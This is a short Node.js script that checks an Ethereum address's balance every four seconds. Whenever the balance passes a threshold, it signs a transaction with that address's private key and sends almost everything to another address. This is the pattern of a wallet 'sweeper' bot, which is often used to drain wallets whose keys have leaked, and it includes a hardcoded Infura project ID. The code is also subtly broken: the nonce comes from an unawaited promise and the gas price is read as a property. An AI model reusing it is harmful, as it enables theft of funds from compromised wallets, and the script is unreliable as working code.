const https = require('https');
const Web3 = require('web3');
const { Transaction } = require('ethereumjs-tx');

const address = 'WALLET_ADDRESS1';
const apiKey = 'API_KEY'; //Etherscan API
const privateKey = 'WALLET_ADDRESS1_PRIVATE_KEY';
const recipientAddress = 'YOUR_WALLET_ADDRESS';

const web3 = new Web3(new Web3.providers.HttpProvider('https://mainnet.infura.io/v3/384a4d7c08be4d9bb11183090df1295f'));

setInterval(() => {
  console.log('Checking balance...');

  const options = {
    hostname: 'api.etherscan.io',
    path: '/api?module=account&action=balance&address=' + address + '&apikey=' + apiKey,
    method: 'GET'
  };

  const req = https.request(options, (res) => {
    let data = '';

    res.on('data', (chunk) => {
      data += chunk;
    });

    res.on('end', () => {
      console.log('Received balance response.');
      const response = JSON.parse(data);
      if (response.status === '1') {
        console.log(`Balance: ${response.result}`);
        const balance = response.result;
        if (balance > 100000000000000) {
          console.log('Sending transaction...');
          const nonce = Number(web3.eth.getTransactionCount(address));
          const gasPrice = web3.eth.gasPrice;
          const gasLimit = 21000;
          const value = balance - 100000000000000; // leave a small amount as a transaction fee
          const data = '0x';

          const rawTransaction = {
            nonce: nonce,
            gasPrice: gasPrice,
            gasLimit: gasLimit,
            to: recipientAddress,
            value: value,
            data: data
          };

          const tx = new Transaction(rawTransaction, {'chain':'mainnet'});
          tx.sign(Buffer.from(privateKey, 'hex'));
          const serializedTx = tx.serialize();

          web3.eth.sendSignedTransaction('0x' + serializedTx.toString('hex'), (err, txHash) => {
            if (err) {
              console.error(`Error sending transaction: ${err}`);
            } else {
              console.log(`Transaction successful. Hash: ${txHash}`);
            }
          });
        } else {
          console.log('Balance is not above threshold.');
        }
      } else {
        console.error(`Error: ${response.message}`);
      }
    });
  });

  req.on('error', (error) => {
    console.error(`Error making request: ${error}`);
  });

  req.end();
}, 4000);

